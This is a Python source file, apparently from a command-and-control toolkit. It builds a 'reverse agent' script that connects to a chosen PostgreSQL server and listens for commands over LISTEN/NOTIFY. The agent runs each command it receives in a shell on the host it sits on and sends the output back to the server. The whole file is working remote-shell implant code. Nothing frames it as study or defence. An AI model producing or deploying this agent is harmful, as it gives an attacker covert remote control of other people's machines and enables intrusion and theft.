#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""PostgreSQL LISTEN/NOTIFY reverse agent script builder."""

from __future__ import annotations


def build_postgresql_notify_agent_script(
    db_host: str,
    db_port: int,
    username: str,
    password: str,
    database: str,
    client_id: str,
    command_channel: str = "ks_cmd",
    result_channel: str = "ks_result",
) -> str:
    return f'''
import json,subprocess,select,time
try:
    import psycopg2
    from psycopg2.extensions import ISOLATION_LEVEL_AUTOCOMMIT
except ImportError:
    raise SystemExit("pip install psycopg2-binary")

HOST={db_host!r};PORT={int(db_port)};USER={username!r};PASS={password!r}
DB={database!r};CID={client_id!r};CMD={command_channel!r};RES={result_channel!r}

conn=psycopg2.connect(host=HOST,port=PORT,user=USER,password=PASS,dbname=DB)
conn.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
cur=conn.cursor()
cur.execute(f'LISTEN "{{CMD}}"')
cur.execute(f'NOTIFY "{{RES}}", %s', (json.dumps({{"type":"register","client_id":CID}}),))

def run_cmd(cmd):
    try:
        p=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=120)
        out=(p.stdout or "")+(p.stderr or "")
        if not out.strip():
            out=f"exit {{p.returncode}}\\n"
        return out
    except Exception as e:
        return str(e)

while True:
    if select.select([conn],[],[],5)!=( [],[],[] ):
        conn.poll()
        while conn.notifies:
            n=conn.notifies.pop(0)
            try:
                data=json.loads(n.payload)
            except Exception:
                continue
            if data.get("client_id") and data["client_id"]!=CID:
                continue
            cmd=str(data.get("command") or "").strip()
            if not cmd:
                continue
            out=run_cmd(cmd)
            cur.execute(f'NOTIFY "{{RES}}", %s', (json.dumps({{"client_id":CID,"output":out}}),))
    time.sleep(0.2)
'''
